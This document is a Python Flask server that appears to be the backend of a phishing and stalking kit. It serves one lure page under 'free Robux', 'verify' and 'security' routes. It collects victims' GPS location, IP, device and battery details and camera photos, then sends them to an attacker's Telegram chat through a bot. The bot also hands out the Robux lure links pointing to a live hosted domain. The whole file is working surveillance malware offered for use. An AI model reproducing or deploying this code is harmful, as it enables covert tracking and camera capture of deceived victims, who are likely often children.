from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests, base64, os

app = Flask(__name__)
CORS(app)

TELEGRAM_TOKEN = os.environ.get('BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.environ.get('YOUR_CHAT_ID', '')

def send_telegram(data):
    bat = data.get('battery',{})
    dev = data.get('device',{})
    net = data.get('network',{})
    con = data.get('connection',{})
    
    msg = f"""🎯 *NEW SESSION*

🕐 `{data.get('timestamp')}`
🆔 `{data.get('sessionId')}`

📍 *GPS:*
• Lat: `{data.get('gps',{}).get('lat','?')}`
• Lon: `{data.get('gps',{}).get('lon','?')}`
• Accuracy: `{data.get('gps',{}).get('accuracy','?')}`

🌐 *NETWORK:*
• IP: `{net.get('ip','?')}`
• City: {net.get('city','?')}
• Region: {net.get('region','?')}
• Country: {net.get('country','?')}
• ISP: {net.get('isp','?')}

📱 *DEVICE:*
• Platform: `{dev.get('platform','?')}`
• Screen: {dev.get('screen','?')} @ {dev.get('pixelRatio','?')}x
• Cores: {dev.get('cores','?')} | RAM: {dev.get('memory','?')}GB
• Language: {dev.get('language','?')}
• Timezone: {dev.get('timezone','?')}

🔋 *BATTERY:*
• Level: {bat.get('level','?')}
• Charging: {bat.get('charging','?')}

📶 *CONNECTION:*
• Type: {con.get('type','?')}
• Speed: {con.get('downlink','?')}
• RTT: {con.get('rtt','?')}

🔗 *Page:* {data.get('pageInfo',{}).get('url','?')}
"""

    try:
        requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
                     json={'chat_id': TELEGRAM_CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    except: pass

    if data.get('photo'):
        try:
            b = base64.b64decode(data['photo'].split(',')[1])
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto',
                         data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸 CAMERA CAPTURE'},
                         files={'photo': ('photo.jpg', b, 'image/jpeg')})
        except: pass

@app.route('/collect', methods=['POST'])
def collect():
    send_telegram(request.json)
    return jsonify({'status':'ok'})

@app.route('/')
@app.route('/video')
@app.route('/verify')
@app.route('/security')
@app.route('/roblox')
@app.route('/freerobux')
def index():
    return send_from_directory('.', 'webpage.html')

@app.route('/collector.js')
def js():
    return send_from_directory('.', 'collector.js')

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.json
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')
        if text in ['/start', '/link']:
            msg = """🎮 *FREE ROBUX LINKS!* 🎮

1️⃣ https://hello-camera-production.up.railway.app/roblox
2️⃣ https://hello-camera-production.up.railway.app/freerobux
3️⃣ https://hello-camera-production.up.railway.app/video

🎁 *Claim your Robux now!* 🎁"""
            requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage',
                         json={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
    return jsonify({'status':'ok'})

@app.route('/setup_webhook')
def setup_webhook():
    r = requests.get(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url=https://hello-camera-production.up.railway.app/webhook')
    return jsonify(r.json())

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
